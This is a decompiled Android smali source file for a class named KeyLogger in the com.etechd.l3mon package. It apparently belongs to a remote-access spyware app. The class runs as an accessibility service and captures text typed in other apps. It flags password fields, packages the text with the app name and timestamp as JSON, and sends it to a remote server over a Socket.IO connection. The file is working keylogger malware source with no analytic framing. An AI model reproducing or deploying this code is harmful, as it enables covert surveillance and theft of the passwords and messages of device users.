.class public Lcom/etechd/l3mon/KeyLogger;
.super Landroid/accessibilityservice/AccessibilityService;
.source "KeyLogger.java"


# static fields
.field private static final LOG_TAG:Ljava/lang/String;

.field private static isLogged:Z = false

.field private static isPassword:Z = false

.field private static lastMSG:Ljava/lang/String; = ""

.field private static lastPKG:Ljava/lang/String; = ""


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v0, 0x2

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    const-string v2, "KeyLogger"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    aput-object v2, v0, v1

    const-string v1, "%s-%s"

    .line 16
    invoke-static {v1, v0}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/etechd/l3mon/KeyLogger;->LOG_TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 10
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    return-void
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 14

    .line 42
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    .line 43
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventTime()J

    move-result-wide v1

    .line 45
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "["

    const-string v5, ""

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "]"

    invoke-virtual {v3, v4, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    .line 48
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v4

    const/16 v6, 0x20

    const-string v7, "0xKL"

    const-string v8, "content"

    const-string v9, " (password)"

    const-string v10, "eventTime"

    const-string v11, "appName"

    const/4 v12, 0x0

    const/4 v13, 0x1

    if-eq v4, v6, :cond_3

    const/16 v5, 0x2000

    if-eq v4, v5, :cond_0

    goto/16 :goto_3

    .line 108
    :cond_0
    sput-boolean v12, Lcom/etechd/l3mon/KeyLogger;->isLogged:Z

    .line 109
    sget-object v4, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v4, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    sget-object v4, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    sget-object v4, Lcom/etechd/l3mon/KeyLogger;->lastPKG:Ljava/lang/String;

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_2

    .line 111
    :try_start_0
    sget-boolean v4, Lcom/etechd/l3mon/KeyLogger;->isPassword:Z

    if-eqz v4, :cond_1

    .line 112
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    .line 115
    :cond_1
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 116
    invoke-virtual {v4, v11, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 117
    sget-object v0, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v4, v8, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 118
    invoke-virtual {v4, v10, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 119
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    new-array v1, v13, [Ljava/lang/Object;

    aput-object v4, v1, v12

    invoke-virtual {v0, v7, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 120
    sput-boolean v13, Lcom/etechd/l3mon/KeyLogger;->isLogged:Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 122
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    .line 125
    :cond_2
    :goto_0
    sput-object v3, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    goto/16 :goto_3

    .line 135
    :cond_3
    sget-object v3, Lcom/etechd/l3mon/KeyLogger;->lastPKG:Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 136
    sget-object v3, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_5

    sget-boolean v3, Lcom/etechd/l3mon/KeyLogger;->isLogged:Z

    if-nez v3, :cond_5

    .line 138
    :try_start_1
    sget-boolean v3, Lcom/etechd/l3mon/KeyLogger;->isPassword:Z

    if-eqz v3, :cond_4

    .line 139
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    .line 142
    :cond_4
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 143
    sget-object v4, Lcom/etechd/l3mon/KeyLogger;->lastPKG:Ljava/lang/String;

    invoke-virtual {v3, v11, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 144
    sget-object v4, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    invoke-virtual {v3, v8, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 145
    invoke-virtual {v3, v10, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 146
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v4

    invoke-virtual {v4}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v4

    new-array v6, v13, [Ljava/lang/Object;

    aput-object v3, v6, v12

    invoke-virtual {v4, v7, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 147
    sput-boolean v13, Lcom/etechd/l3mon/KeyLogger;->isLogged:Z
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v3

    .line 149
    invoke-virtual {v3}, Lorg/json/JSONException;->printStackTrace()V

    .line 151
    :goto_1
    sput-object v5, Lcom/etechd/l3mon/KeyLogger;->lastMSG:Ljava/lang/String;

    .line 154
    :cond_5
    sget-object v3, Lcom/etechd/l3mon/KeyLogger;->LOG_TAG:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "New Package: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 156
    :try_start_2
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 157
    invoke-virtual {v3, v11, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 158
    invoke-virtual {v3, v10, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 159
    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;

    move-result-object v1

    invoke-virtual {v1}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v1

    const-string v2, "0xROA"

    new-array v4, v13, [Ljava/lang/Object;

    aput-object v3, v4, v12

    invoke-virtual {v1, v2, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 160
    sput-boolean v13, Lcom/etechd/l3mon/KeyLogger;->isLogged:Z
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v1

    .line 162
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    .line 164
    :goto_2
    sput-object v0, Lcom/etechd/l3mon/KeyLogger;->lastPKG:Ljava/lang/String;

    .line 175
    :cond_6
    :goto_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->isPassword()Z

    move-result p1

    sput-boolean p1, Lcom/etechd/l3mon/KeyLogger;->isPassword:Z

    return-void
.end method

.method public onInterrupt()V
    .locals 2

    .line 182
    sget-object v0, Lcom/etechd/l3mon/KeyLogger;->LOG_TAG:Ljava/lang/String;

    const-string v1, "onInterrupt"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public onServiceConnected()V
    .locals 2

    .line 24
    sget-object v0, Lcom/etechd/l3mon/KeyLogger;->LOG_TAG:Ljava/lang/String;

    const-string v1, "Starting service"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method
